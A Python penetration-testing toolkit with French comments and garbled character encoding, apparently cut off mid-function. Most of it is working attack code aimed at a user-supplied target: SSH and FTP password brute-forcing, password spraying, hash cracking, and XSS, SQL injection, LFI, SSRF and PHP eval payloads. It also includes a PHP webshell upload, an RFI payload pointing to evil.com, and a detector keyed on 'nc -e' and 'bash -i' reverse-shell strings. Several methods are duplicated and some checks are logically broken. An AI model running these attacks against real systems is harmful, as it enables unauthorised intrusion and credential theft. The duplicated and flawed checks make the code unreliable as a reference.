#!/usr/bin/env python3


# ğŸ“Œ Modules Essentiels du SystÃ¨me
import os
import sys
import time
import random
import socket
import hashlib
import json
import re
import base64  # Encodage/DÃ©codage
import subprocess  # ExÃ©cution de commandes systÃ¨mes
import zipfile  # Manipulation de fichiers compressÃ©s
import threading  # Multithreading pour les scans rapides
import ssl  # Analyse TLS
import shutil  # Gestion des fichiers
import logging  # Gestion avancÃ©e des logs
import argparse  # Gestion des arguments en ligne de commande
from datetime import datetime  # Gestion des timestamps
from urllib.parse import urlparse  # âœ… GÃ¨re les URLs

# ğŸ“Œ Modules de Pentesting & CybersÃ©curitÃ©
import dns.resolver  # Recherche DNS
from Cryptodome.Cipher import AES  # Chiffrement
from bs4 import BeautifulSoup  # Scraping Web
import requests  # RequÃªtes HTTP
import jwt  # Manipulation JSON Web Tokens
import concurrent.futures  # âœ… Multithreading (port scan, bruteforce, etc.)

# ğŸ“Œ Modules RÃ©seau et Protocoles
import scapy.config
scapy.config.conf.use_pcap = True  # âœ… Ã‰vite les erreurs de permissions sous Termux
from scapy.all import sniff, IP, TCP, UDP  # Analyse RÃ©seau
from smbprotocol.connection import Connection  # âœ… Connexion SMB via smbprotocol (Termux compatible)
from ftplib import FTP  # Connexion FTP

# ğŸ“Œ Modules d'Interaction & Affichage Dynamique
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, BarColumn, TimeElapsedColumn, TextColumn, SpinnerColumn
from rich.table import Table
from rich.prompt import Confirm, Prompt

# ğŸ“Œ Modules de Traitement d'Images et de DonnÃ©es
from PIL import Image  # âœ… Extraction de mÃ©tadonnÃ©es dâ€™images
from io import BytesIO  # âœ… Gestion des flux binaires (images, fichiers, etc.)

# ğŸ“Œ Configuration du Logging
logging.basicConfig(
    format="%(asctime)s - [%(levelname)s] %(message)s",
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(sys.stdout),  # Affiche les logs dans le terminal
    ],
)

# ğŸ“Œ Console Globale pour un Affichage Propre
console = Console()

# ğŸ“Œ Bruteforce SSH avec pexpect (remplace paramiko)
import pexpect  # âœ… GÃ¨re les connexions SSH sans paramiko








class CyberTool:
    def __init__(self):
        """ğŸ”¥ Initialisation de CyberTool avec ses fonctionnalitÃ©s"""
        self.console = console
        self.results = {}

        # ğŸ”¥ Chargement des fonctionnalitÃ©s
        self.init_features()

    def init_features(self):
        """ğŸš€ Initialise la liste des fonctionnalitÃ©s"""
        self.feature_map = {
            "dns_lookup": "RÃ©solution DNS",
            "port_scan": "Scan des ports",
            "headers_analysis": "Analyse des headers HTTP",
            "directory_bruteforce": "Brute-force de rÃ©pertoires",
            "cms_detector": "DÃ©tection CMS",
            "exploit_cve_scanner": "Scan des vulnÃ©rabilitÃ©s CVE",
            "code_execution_testing": "Test d'exÃ©cution de code",
            "cloud_storage_enum": "Ã‰numÃ©ration Cloud (AWS, GCP, Azure)",
            "smart_contract_audit": "Audit de contrats intelligents",
            "network_traffic_analysis": "Analyse du trafic rÃ©seau",
            "subdomain_enum": "Ã‰numÃ©ration des sous-domaines",
            "sql_injection_test": "Test d'injection SQL",
            "xss_scanner": "DÃ©tection de Cross-Site Scripting (XSS)",
            "csrf_detection": "DÃ©tection de Cross-Site Request Forgery (CSRF)",
            "lfi_scanner": "DÃ©tection de Local File Inclusion (LFI)",
            "rfi_scanner": "DÃ©tection de Remote File Inclusion (RFI)",
            "ssrf_scanner": "DÃ©tection de Server-Side Request Forgery (SSRF)",
            "jwt_analysis": "Analyse et dÃ©codage JWT",
            "exposed_api_scan": "Scan des API exposÃ©es",
            "honeypot_detection": "DÃ©tection de Honeypot",
            "open_redirect_test": "DÃ©tection d'Open Redirect",
            "sensitive_data_exposure": "DÃ©tection d'exposition de donnÃ©es sensibles",
            "metadata_extraction": "Extraction de mÃ©tadonnÃ©es",
            "user_enum": "Ã‰numÃ©ration d'utilisateurs",
            "php_eval_detection": "DÃ©tection d'exÃ©cution de code PHP",
            "tls_analysis": "Analyse TLS et certificats",
            "dns_takeover_test": "Test de prise de contrÃ´le DNS",
            "ssh_bruteforce": "Bruteforce SSH",
            "ftp_bruteforce": "Bruteforce FTP",
            "docker_registry_scan": "Scan de registre Docker",
            "password_spray": "Attaque Password Spraying",
            "api_rate_limit_test": "Test de limitations dâ€™API",
            "browser_fingerprint": "Fingerprinting Navigateur",
            "hidden_service_finder": "Recherche de services cachÃ©s",
            "iot_vulnerability_scan": "Scan de vulnÃ©rabilitÃ©s IoT",
            "cdn_detection": "DÃ©tection de CDN",
            "websocket_scan": "Scan des WebSockets",
            "reverse_shell_check": "DÃ©tection de reverse shell",
            "waf_detection": "DÃ©tection de pare-feu WAF",
            "file_upload_test": "Test de tÃ©lÃ©versement de fichiers",
            "kubernetes_enum": "Ã‰numÃ©ration Kubernetes",
            "cloudflare_bypass": "Bypass de Cloudflare",
            "web_fingerprint": "Fingerprinting Web",
            "password_cracking": "Craquage de mots de passe",
            "smb_enum": "Ã‰numÃ©ration SMB",
            "ftp_anonymous_login": "Connexion FTP anonyme",
            "nfs_enum": "Ã‰numÃ©ration des exports NFS",
            "vhost_scanner": "Scan des hÃ´tes virtuels",
            "proxy_detection": "DÃ©tection de serveur proxy",
            "honeypot_advanced_detection": "DÃ©tection avancÃ©e de Honeypots"
        }








    def dns_lookup(self, target):
        """ğŸ“¡ RÃ©solution DNS avec gestion des erreurs"""
        try:
            ip = socket.gethostbyname(target)
            return {"target": target, "resolved_ip": ip}
        except socket.gaierror:
            return {"error": "Erreur de rÃ©solution DNS"}

    def port_scan(self, target, ports=[21, 22, 80, 443, 3306], threads=10):
        """ğŸ” Scan des ports avec multithreading"""
        def check_port(port):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            result = s.connect_ex((target, port))
            s.close()
            return port if result == 0 else None

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            open_ports = list(filter(None, executor.map(check_port, ports)))

        return {"target": target, "open_ports": open_ports} if open_ports else {"target": target, "open_ports": "Aucun port ouvert dÃ©tectÃ©"}


    def headers_analysis(self, target):
        """ğŸ› ï¸ Analyse complÃ¨te des headers HTTP
        Retourne une rÃ©ponse dÃ©taillÃ©e incluant le statut, tous les headers et un Ã©chantillon du contenu.
        """
        # Correction de l'URL si nÃ©cessaire
        if not target.startswith("http"):
            url = f"http://{target}"
        else:
            url = target

        try:
            response = requests.get(url, timeout=5)
            headers = dict(response.headers)
            content_sample = response.text[:1000]  # Ã‰chantillon de 1000 caractÃ¨res du contenu

            self.console.print(f"\nğŸ” [bold cyan]Analyse complÃ¨te des headers de :[/bold cyan] {url}")
            self.console.print(f"[bold yellow]Statut HTTP :[/bold yellow] {response.status_code}")
            self.console.print(f"[bold green]Nombre de headers :[/bold green] {len(headers)}")
            
            return {
                "url": url,
                "status_code": response.status_code,
                "headers": headers,
                "content_sample": content_sample
            }
        except requests.RequestException as e:
            return {"error": f"Erreur lors de l'analyse complÃ¨te des headers: {str(e)}"}




    def directory_bruteforce(self, target, wordlist=None):
        """ğŸšª Brute-force de rÃ©pertoires"""
        if not wordlist:
            wordlist = ["admin", "login", "dashboard", "config", "backup"]

        found_dirs = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(lambda w: (w, self.get_http_response(f"http://{target}/{w}/")["status"]), wordlist)
            for word, status in results:
                if status == 200:
                    found_dirs.append(f"http://{target}/{word}/")

        return {"target": target, "found_directories": found_dirs} if found_dirs else {"target": target, "found_directories": "Aucun rÃ©pertoire trouvÃ©"}

    def cms_detector(self, target):
        """ğŸ–¥ï¸ DÃ©tection CMS optimisÃ©e"""
        url = f"http://{target}"
        response_data = self.get_http_response(url)
        if "error" in response_data:
            return response_data

        content = response_data["content"].lower()
        headers = response_data["headers"]

        cms_signatures = {
            "WordPress": ["wp-content", "wp-includes", "wordpress"],
            "Drupal": ["drupal.js", "sites/all/modules"],
            "Joomla": ["Joomla!", "com_content"]
        }

        detected_cms = [name for name, signs in cms_signatures.items() if any(s in content or s in headers for s in signs)]
        return {"target": target, "cms_detected": detected_cms} if detected_cms else {"target": target, "cms_detected": "Aucun CMS dÃ©tectÃ©"}

    def exploit_cve_scanner(self, target):
        """âš ï¸ Scan des vulnÃ©rabilitÃ©s CVE"""
        url = f"https://cve.circl.lu/api/search/{target}"
        return self.get_http_response(url)

    def cloud_storage_enum(self, target):
        """â˜ï¸ Ã‰numÃ©ration Cloud (AWS, GCP, Azure)"""
        buckets = [
            f"http://{target}.s3.amazonaws.com",
            f"http://{target}.blob.core.windows.net",
            f"http://{target}.storage.googleapis.com"
        ]
        available_buckets = []
        for bucket in buckets:
            response_data = self.get_http_response(bucket)
            if response_data.get("status") in [200, 403]:
                available_buckets.append({"bucket": bucket, "status": response_data["status"]})
        return {"target": target, "cloud_buckets": available_buckets} if available_buckets else {"target": target, "cloud_buckets": "Aucun stockage Cloud dÃ©tectÃ©"}

    def smart_contract_audit(self, target):
        """ğŸ“œ Audit de contrats intelligents via l'API Etherscan"""
        etherscan_api = "https://api.etherscan.io/api"
        url = f"{etherscan_api}?module=contract&action=getsourcecode&address={target}"
        return self.get_http_response(url)

    def xss_scanner(self, target):
        """ğŸ’€ DÃ©tection de Cross-Site Scripting (XSS)"""
        payloads = ["<script>alert(1)</script>", "'><img src=x onerror=alert(1)>"]
        results = {}
        for payload in payloads:
            url = f"http://{target}?q={payload}"
            response_data = self.get_http_response(url)
            if payload in response_data.get("content", ""):
                results[payload] = "Potentielle vulnÃ©rabilitÃ© XSS dÃ©tectÃ©e"
        return {"target": target, "xss_vulnerabilities": results} if results else {"target": target, "xss_vulnerabilities": "Aucune vulnÃ©rabilitÃ© XSS dÃ©tectÃ©e"}

    def subdomain_enum(self, target, wordlist=None):
        """ğŸ” Ã‰numÃ©ration des sous-domaines"""
        if not wordlist:
            wordlist = ["www", "mail", "ftp", "api", "dev", "blog"]
        subdomains = []
        for sub in wordlist:
            subdomain = f"{sub}.{target}"
            try:
                socket.gethostbyname(subdomain)
                subdomains.append(subdomain)
            except socket.gaierror:
                pass
        return {"target": target, "subdomains": subdomains} if subdomains else {"target": target, "subdomains": "Aucun sous-domaine trouvÃ©"}



    def sql_injection_test(self, target):
        """ğŸ›‘ Test basique d'injection SQL"""
        payloads = ["' OR '1'='1", "' UNION SELECT 1,2,3--"]
        results = {}
        for payload in payloads:
            url = f"http://{target}?id={payload}"
            response_data = self.get_http_response(url)
            content = response_data.get("content", "").lower()
            if "error" not in response_data and ("error" in content or "syntax" in content):
                results[payload] = "Potentielle vulnÃ©rabilitÃ© dÃ©tectÃ©e"
        return {"target": target, "sql_injection": results} if results else {"target": target, "sql_injection": "Aucune vulnÃ©rabilitÃ© dÃ©tectÃ©e"}

    def csrf_detection(self, target):
        """ğŸ›¡ï¸ DÃ©tection de Cross-Site Request Forgery (CSRF)"""
        url = f"http://{target}"
        response_data = self.get_http_response(url)
        if "error" in response_data:
            return response_data
        soup = BeautifulSoup(response_data.get("content", ""), "html.parser")
        forms = soup.find_all("form")
        csrf_protected = any("csrf" in str(form).lower() for form in forms)
        return {"target": target, "csrf_protected": csrf_protected}

    def lfi_scanner(self, target):
        """ğŸ“‚ DÃ©tection de Local File Inclusion (LFI)"""
        payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
        results = {}
        for payload in payloads:
            url = f"http://{target}/index.php?file={payload}"
            response_data = self.get_http_response(url)
            content = response_data.get("content", "")
            if "root:x" in content or "for 16-bit app support" in content:
                results[payload] = "Potentielle vulnÃ©rabilitÃ© LFI dÃ©tectÃ©e"
        return {"target": target, "lfi_vulnerabilities": results} if results else {"target": target, "lfi_vulnerabilities": "Aucune vulnÃ©rabilitÃ© dÃ©tectÃ©e"}

    def rfi_scanner(self, target):
        """ğŸŒ DÃ©tection de Remote File Inclusion (RFI)"""
        payloads = ["http://evil.com/shell.txt", "https://raw.githubusercontent.com/malicious/script.php"]
        results = {}
        for payload in payloads:
            url = f"http://{target}/index.php?file={payload}"
            response_data = self.get_http_response(url)
            content = response_data.get("content", "").lower()
            if "malicious" in content or "shell" in content:
                results[payload] = "Potentielle vulnÃ©rabilitÃ© RFI dÃ©tectÃ©e"
        return {"target": target, "rfi_vulnerabilities": results} if results else {"target": target, "rfi_vulnerabilities": "Aucune vulnÃ©rabilitÃ© dÃ©tectÃ©e"}

    def ssrf_scanner(self, target):
        """ğŸŒ DÃ©tection de Server-Side Request Forgery (SSRF)"""
        payloads = ["http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data"]
        results = {}
        for payload in payloads:
            url = f"http://{target}/proxy?url={payload}"
            response_data = self.get_http_response(url)
            if response_data.get("status") == 200:
                results[payload] = "Potentielle vulnÃ©rabilitÃ© SSRF dÃ©tectÃ©e"
        return {"target": target, "ssrf_vulnerabilities": results} if results else {"target": target, "ssrf_vulnerabilities": "Aucune vulnÃ©rabilitÃ© dÃ©tectÃ©e"}

    def jwt_analysis(self, jwt_token):
        """ğŸ”‘ Analyse et dÃ©codage JWT"""
        try:
            decoded = jwt.decode(jwt_token, options={"verify_signature": False})
            return {"jwt_token": jwt_token, "decoded_payload": decoded}
        except jwt.DecodeError:
            return {"error": "JWT invalide"}

    def exposed_api_scan(self, target):
        """ğŸ› ï¸ Scan des API exposÃ©es"""
        endpoints = ["/api/v1/status", "/api/v1/users", "/api/v1/admin"]
        results = {}
        for endpoint in endpoints:
            url = f"http://{target}{endpoint}"
            response_data = self.get_http_response(url)
            if response_data.get("status") == 200:
                results[endpoint] = "Endpoint accessible"
        return {"target": target, "exposed_api_endpoints": results} if results else {"target": target, "exposed_api_endpoints": "Aucun endpoint exposÃ©"}

    def open_redirect_test(self, target):
        """ğŸ”„ DÃ©tection d'Open Redirect"""
        payloads = ["/redirect?url=https://evil.com", "/goto?target=https://evil.com"]
        results = {}
        for payload in payloads:
            url = f"http://{target}{payload}"
            response_data = self.get_http_response(url)
            # Ici, on vÃ©rifie si "evil.com" est prÃ©sent dans le contenu (cas simplifiÃ©)
            if "evil.com" in response_data.get("content", "").lower():
                results[payload] = "Potentielle vulnÃ©rabilitÃ© dÃ©tectÃ©e"
        return {"target": target, "open_redirects": results} if results else {"target": target, "open_redirects": "Aucune vulnÃ©rabilitÃ© dÃ©tectÃ©e"}

    def sensitive_data_exposure(self, target):
        """ğŸ”“ DÃ©tection d'exposition de donnÃ©es sensibles"""
        patterns = {
            "API Keys": r"(?i)api[_-]?key\s*=\s*[\"'][a-zA-Z0-9]+[\"']",
            "Token JWT": r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+",
            "Emails": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
        }
        results = {}
        url = f"http://{target}"
        response_data = self.get_http_response(url)
        content = response_data.get("content", "")
        for name, pattern in patterns.items():
            found = re.findall(pattern, content)
            if found:
                results[name] = found
        return {"target": target, "sensitive_data": results} if results else {"target": target, "sensitive_data": "Aucune donnÃ©e sensible trouvÃ©e"}

    def metadata_extraction(self, target):
        """ğŸ“¸ Extraction de mÃ©tadonnÃ©es d'images"""
        url = f"http://{target}/image.jpg"
        response_data = self.get_http_response(url)
        if "error" in response_data:
            return response_data
        try:
            img = Image.open(BytesIO(response_data.get("content", "").encode()))
            return {"target": target, "metadata": img.info}
        except Exception as e:
            return {"error": f"Impossible d'extraire les mÃ©tadonnÃ©es : {str(e)}"}




    def code_execution_testing(self, target, payload={"cmd": "whoami"}):
        """ğŸ’» Test d'exÃ©cution de code via POST"""
        url = f"http://{target}/cmd_exec"
        response_data = self.get_http_response(url, method="POST", data=payload)
        if "error" in response_data:
            return response_data
        return {"target": target, "execution_output": response_data.get("content", "")}

    def network_traffic_analysis(self, interface="eth0", packet_count=10):
        """ğŸ“Š Analyse du trafic rÃ©seau avec capture des paquets"""
        try:
            packets = sniff(iface=interface, count=packet_count, timeout=5)
            summaries = [pkt.summary() for pkt in packets]
            return {"interface": interface, "captured_packets": summaries}
        except Exception as e:
            return {"error": f"Impossible de capturer le trafic rÃ©seau sur {interface} : {e}"}

    def honeypot_detection(self, target):
        """ğŸ DÃ©tection de Honeypot via analyse comportementale"""
        url = f"http://{target}"
        headers = {"User-Agent": "MaliciousScanner"}
        response_data = self.get_http_response(url, headers=headers)
        if "error" in response_data:
            return response_data
        if "you have been detected" in response_data.get("content", "").lower() or response_data.get("status") in [403, 429]:
            return {"target": target, "honeypot_detected": True}
        return {"target": target, "honeypot_detected": False}

    def user_enum(self, target):
        """ğŸ‘¥ Ã‰numÃ©ration d'utilisateurs via messages d'erreur"""
        usernames = ["admin", "user", "test", "root"]
        results = {}
        for user in usernames:
            url = f"http://{target}/login"
            response_data = self.get_http_response(url, method="POST", data={"username": user, "password": "test"})
            content = response_data.get("content", "").lower()
            if "invalid password" in content:
                results[user] = "Utilisateur existant"
        return {"target": target, "user_enumeration": results} if results else {"target": target, "user_enumeration": "Aucune Ã©numÃ©ration possible"}

    def php_eval_detection(self, target):
        """ğŸ˜ DÃ©tection d'exÃ©cution de code PHP via eval()"""
        payloads = ["phpinfo();", "system('id');"]
        results = {}
        for payload in payloads:
            url = f"http://{target}/eval.php"
            response_data = self.get_http_response(url, method="POST", data={"code": payload})
            content = response_data.get("content", "").lower()
            if "uid=" in content or "phpinfo()" in content:
                results[payload] = "Potentielle vulnÃ©rabilitÃ© dÃ©tectÃ©e"
        return {"target": target, "php_eval_vulnerabilities": results} if results else {"target": target, "php_eval_vulnerabilities": "Aucune vulnÃ©rabilitÃ© dÃ©tectÃ©e"}

    def tls_analysis(self, target):
        """ğŸ” Analyse des certificats SSL/TLS"""
        try:
            conn = socket.create_connection((target, 443))
            context = ssl.create_default_context()
            with context.wrap_socket(conn, server_hostname=target) as s:
                cert = s.getpeercert()
            return {"target": target, "tls_cert": cert}
        except Exception as e:
            return {"error": f"Impossible d'obtenir le certificat TLS : {e}"}

    def dns_takeover_test(self, target):
        """ğŸŒ Test de prise de contrÃ´le DNS via sous-domaines orphelins"""
        subdomains = ["cdn", "files", "old", "beta"]
        takeover_risks = {}
        for sub in subdomains:
            try:
                resolved_ip = socket.gethostbyname(f"{sub}.{target}")
                # VÃ©rification simple sur la prÃ©sence de chaÃ®nes clÃ©s
                if "aws" in resolved_ip.lower() or "cloudflare" in resolved_ip.lower():
                    takeover_risks[sub] = "Potentiel risque de takeover"
            except socket.gaierror:
                continue
        return {"target": target, "dns_takeover": takeover_risks} if takeover_risks else {"target": target, "dns_takeover": "Aucun risque dÃ©tectÃ©"}

    def ssh_bruteforce(self, target, username="root", passwords=None):
        """ğŸ”‘ Bruteforce SSH basique avec pexpect"""
        if not passwords:
            passwords = ["admin", "root", "password", "123456"]
        import pexpect
        for password in passwords:
            try:
                child = pexpect.spawn(f"ssh {username}@{target}", timeout=5)
                child.expect("password:", timeout=5)
                child.sendline(password)
                idx = child.expect(["#", "Permission denied"], timeout=5)
                child.close()
                if idx == 0:
                    return {"target": target, "ssh_success": f"Connexion rÃ©ussie avec {password}"}
            except (pexpect.exceptions.TIMEOUT, pexpect.exceptions.EOF):
                continue
        return {"target": target, "ssh_success": "Aucune connexion rÃ©ussie"}

    def ftp_bruteforce(self, target, username="anonymous", passwords=None):
        """ğŸ“¡ Bruteforce FTP basique"""
        from ftplib import FTP
        if not passwords:
            passwords = ["admin", "ftp", "123456", "password"]
        for password in passwords:
            try:
                ftp = FTP(target, timeout=5)
                ftp.login(username, password)
                ftp.quit()
                return {"target": target, "ftp_success": f"Connexion rÃ©ussie avec {password}"}
            except Exception:
                continue
        return {"target": target, "ftp_success": "Aucune connexion rÃ©ussie"}

    def docker_registry_scan(self, target):
        """ğŸ³ Scan des registres Docker exposÃ©s"""
        endpoints = ["/v2/", "/v2/_catalog", "/v2/repositories"]
        results = {}
        for endpoint in endpoints:
            url = f"http://{target}{endpoint}"
            response_data = self.get_http_response(url)
            if response_data.get("status") == 200:
                results[endpoint] = "Registre accessible"
        return {"target": target, "docker_registry": results} if results else {"target": target, "docker_registry": "Aucun registre exposÃ© dÃ©tectÃ©"}



    def password_spray(self, target, usernames=None, password="password123"):
        """ğŸ”‘ Attaque Password Spraying sur plusieurs utilisateurs"""
        if not usernames:
            usernames = ["admin", "user", "test", "root"]
        results = {}
        for user in usernames:
            url = f"http://{target}/login"
            response_data = self.get_http_response(url, method="POST", data={"username": user, "password": password})
            content = response_data.get("content", "").lower()
            if "invalid password" not in content:
                results[user] = "AccÃ¨s possible avec ce mot de passe"
        return {"target": target, "password_spray": results} if results else {"target": target, "password_spray": "Aucune connexion rÃ©ussie"}

    def api_rate_limit_test(self, target, endpoint="/api/v1/status", requests_count=50):
        """ğŸ“Š Test de limitations dâ€™API en envoyant un grand nombre de requÃªtes"""
        success_count = 0
        for _ in range(requests_count):
            url = f"http://{target}{endpoint}"
            response_data = self.get_http_response(url)
            if response_data.get("status") == 200:
                success_count += 1
        return {"target": target, "api_rate_limit_test": {"requests_sent": requests_count, "successful_requests": success_count}}

    def browser_fingerprint(self):
        """ğŸ–¥ï¸ GÃ©nÃ©ration d'une empreinte navigateur unique"""
        import platform, uuid
        return {
            "os": platform.system(),
            "os_version": platform.release(),
            "fingerprint": str(uuid.uuid4())
        }

    def hidden_service_finder(self, target):
        """ğŸ” Recherche de services cachÃ©s sur un serveur"""
        ports = [22, 80, 443, 8080, 8443]
        found_services = []
        for port in ports:
            try:
                socket.create_connection((target, port), timeout=2)
                found_services.append(port)
            except Exception:
                continue
        return {"target": target, "hidden_service_finder": found_services} if found_services else {"target": target, "hidden_service_finder": "Aucun service dÃ©tectÃ©"}




    def iot_vulnerability_scan(self, target):
        """ğŸ“¡ Scan des vulnÃ©rabilitÃ©s IoT avec dÃ©tection des ports ouverts et versions"""
        ports = [23, 80, 443, 554, 8080]
        results = {}
        for port in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target, port))
                banner = s.recv(1024).decode().strip()
                results[port] = banner
                s.close()
            except:
                continue
        return {"target": target, "iot_vulnerabilities": results} if results else {"target": target, "iot_vulnerabilities": "Aucune vulnÃ©rabilitÃ© dÃ©tectÃ©e"}





    def cdn_detection(self, target):
        """ğŸŒ DÃ©tection de CDN en analysant les headers de rÃ©ponse"""
        url = f"http://{target}"
        response_data = self.get_http_response(url)
        cdn_providers = ["Cloudflare", "Akamai", "Fastly", "Amazon CloudFront"]
        detected = [cdn for cdn in cdn_providers if any(cdn.lower() in v.lower() for v in response_data.get("headers", {}).values())]
        return {"target": target, "cdn_detected": detected} if detected else {"target": target, "cdn_detected": "Aucun CDN dÃ©tectÃ©"}

    def websocket_scan(self, target):
        """ğŸ”— Scan des WebSockets accessibles"""
        url = f"http://{target}"
        response_data = self.get_http_response(url)
        headers = response_data.get("headers", {})
        if "Upgrade" in headers and "websocket" in headers.get("Upgrade", "").lower():
            return {"target": target, "websocket": "WebSocket dÃ©tectÃ©"}
        return {"target": target, "websocket": "Aucun WebSocket dÃ©tectÃ©"}

    def reverse_shell_check(self, target):
        """ğŸ”„ DÃ©tection de reverse shell sur un serveur"""
        url = f"http://{target}/shell.php"
        response_data = self.get_http_response(url)
        content = response_data.get("content", "").lower()
        if "nc -e" in content or "bash -i" in content:
            return {"target": target, "reverse_shell": "PrÃ©sence d'un reverse shell"}
        return {"target": target, "reverse_shell": "Aucun reverse shell dÃ©tectÃ©"}

    def waf_detection(self, target):
        """ğŸ›¡ï¸ DÃ©tection de pare-feu WAF en envoyant des requÃªtes suspectes"""
        payloads = ["<script>alert(1)</script>", "' OR '1'='1"]
        results = {}
        for payload in payloads:
            url = f"http://{target}?q={payload}"
            response_data = self.get_http_response(url)
            if response_data.get("status") in [403, 406, 500]:
                results[payload] = "PossibilitÃ© d'un WAF"
        return {"target": target, "waf_detected": results} if results else {"target": target, "waf_detected": "Aucun WAF dÃ©tectÃ©"}

    def file_upload_test(self, target):
        """ğŸ“¤ Test de tÃ©lÃ©versement de fichiers dangereux"""
        url = f"http://{target}/upload"
        files = {"file": ("test.php", "<?php system('whoami'); ?>", "application/x-php")}
        response_data = self.get_http_response(url, method="POST", data=None, files=files)
        if response_data.get("status") == 200:
            return {"target": target, "upload_test": "TÃ©lÃ©versement rÃ©ussi"}
        return {"target": target, "upload_test": "TÃ©lÃ©versement Ã©chouÃ©"}

    def kubernetes_enum(self, target):
        """â˜¸ï¸ Ã‰numÃ©ration des clusters Kubernetes exposÃ©s"""
        endpoints = ["/api", "/api/v1/nodes", "/api/v1/pods"]
        results = {}
        for endpoint in endpoints:
            url = f"http://{target}{endpoint}"
            response_data = self.get_http_response(url)
            if response_data.get("status") == 200:
                results[endpoint] = "Accessible"
        return {"target": target, "kubernetes_exposed": results} if results else {"target": target, "kubernetes_exposed": "Aucun endpoint dÃ©tectÃ©"}

    def cloudflare_bypass(self, target):
        """â˜ï¸ Bypass Cloudflare en testant des sous-domaines directs"""
        subdomains = ["direct", "origin", "backend", "server"]
        found = []
        for sub in subdomains:
            try:
                ip = socket.gethostbyname(f"{sub}.{target}")
                found.append(f"{sub}.{target} -> {ip}")
            except socket.gaierror:
                continue
        return {"target": target, "cloudflare_bypass": found} if found else {"target": target, "cloudflare_bypass": "Ã‰chec du contournement"}

    def web_fingerprint(self, target):
        """ğŸ•µï¸â€â™‚ï¸ Fingerprinting Web en analysant les headers et le contenu"""
        url = f"http://{target}"
        response_data = self.get_http_response(url)
        headers = response_data.get("headers", {})
        technologies = []
        if "server" in headers:
            technologies.append(f"Serveur: {headers['server']}")
        if "x-powered-by" in headers:
            technologies.append(f"Powered by: {headers['x-powered-by']}")
        if "wp-content" in response_data.get("content", ""):
            technologies.append("CMS dÃ©tectÃ©: WordPress")
        return {"target": target, "web_fingerprint": technologies} if technologies else {"target": target, "web_fingerprint": "Aucune technologie identifiÃ©e"}

    def password_cracking(self, hash_value, hash_type="md5"):
        """ğŸ”“ Craquage de hash basique avec dictionnaire"""
        wordlist = ["admin", "password", "123456", "letmein"]
        for word in wordlist:
            hashed_word = hashlib.new(hash_type, word.encode()).hexdigest()
            if hashed_word == hash_value:
                return {"hash_value": hash_value, "plaintext": word}
        return {"hash_value": hash_value, "plaintext": "Non trouvÃ©"}



    def smb_enum(self, target):
        """ğŸ“‚ Ã‰numÃ©ration des partages SMB accessibles"""
        try:
            from smbprotocol.connection import Connection
            import uuid
            conn = Connection(uuid.uuid4().hex, target)
            conn.connect()
            shares = conn.list_shares()
            return {"target": target, "smb_shares": [s.name for s in shares]}
        except Exception as e:
            return {"error": f"Impossible de se connecter au SMB : {e}"}

    def ftp_anonymous_login(self, target):
        """ğŸŒ Test de connexion FTP anonyme"""
        try:
            from ftplib import FTP
            ftp = FTP(target, timeout=5)
            ftp.login("anonymous", "anonymous")
            ftp.quit()
            return {"target": target, "ftp_anonymous": "Connexion anonyme rÃ©ussie"}
        except Exception as e:
            return {"target": target, "ftp_anonymous": f"Connexion anonyme impossible : {e}"}

    def nfs_enum(self, target):
        """ğŸ“ Ã‰numÃ©ration des exports NFS accessibles"""
        url = f"http://{target}/rpc/nfs/export"
        response_data = self.get_http_response(url)
        if "error" not in response_data and response_data.get("status") == 200:
            return {"target": target, "nfs_exports": response_data.get("content", "Inconnu")}
        else:
            return {"error": "Impossible d'Ã©numÃ©rer les exports NFS"}

    def vhost_scanner(self, target, wordlist=None):
        """ğŸ” Scan des hÃ´tes virtuels en testant plusieurs noms courants"""
        if not wordlist:
            wordlist = ["dev", "staging", "test", "api"]
        found = []
        for sub in wordlist:
            try:
                ip = socket.gethostbyname(f"{sub}.{target}")
                found.append(f"{sub}.{target} -> {ip}")
            except socket.gaierror:
                continue
        return {"target": target, "vhosts": found} if found else {"target": target, "vhosts": "Aucun vhost dÃ©tectÃ©"}

    def proxy_detection(self, target):
        """ğŸ›¡ï¸ DÃ©tection de serveur proxy via headers HTTP"""
        url = f"http://{target}"
        response_data = self.get_http_response(url)
        if "error" in response_data:
            return response_data
        proxy_headers = ["via", "x-forwarded-for", "x-proxy-id"]
        proxies = [h for h in proxy_headers if h in response_data.get("headers", {})]
        return {"target": target, "proxy_detected": proxies} if proxies else {"target": target, "proxy_detected": "Aucun proxy dÃ©tectÃ©"}

    def honeypot_advanced_detection(self, target):
        """ğŸ DÃ©tection avancÃ©e de Honeypots via analyse comportementale"""
        url = f"http://{target}"
        headers = {"User-Agent": "MaliciousScanner"}
        response_data = self.get_http_response(url, headers=headers)
        if "error" in response_data:
            return response_data
        if "you have been detected" in response_data.get("content", "").lower() or response_data.get("status") in [403, 429]:
            return {"target": target, "honeypot_detected": "PrÃ©sence probable d'un honeypot"}
        return {"target": target, "honeypot_detected": "Pas de honeypot dÃ©tectÃ©"}

    def user_enum(self, target):
        """ğŸ‘¥ Ã‰numÃ©ration d'utilisateurs via messages d'erreur"""
        usernames = ["admin", "user", "test", "root"]
        results = {}
        for user in usernames:
            url = f"http://{target}/login"
            response_data = self.get_http_response(url, method="POST", data={"username": user, "password": "test"})
            if "invalid password" in response_data.get("content", "").lower():
                results[user] = "Utilisateur existant"
        return {"target": target, "user_enumeration": results} if results else {"target": target, "user_enumeration": "Aucune Ã©numÃ©ration dÃ©tectÃ©e"}

    def php_eval_detection(self, target):
        """ğŸ˜ DÃ©tection d'exÃ©cution de code PHP via eval()"""
        payloads = ["phpinfo();", "system('id');"]
        results = {}
        for payload in payloads:
            url = f"http://{target}/eval.php"
            response_data = self.get_http_response(url, method="POST", data={"code": payload})
            content = response_data.get("content", "").lower()
            if "uid=" in content or "phpinfo()" in content:
                results[payload] = "Potentielle vulnÃ©rabilitÃ© dÃ©tectÃ©e"
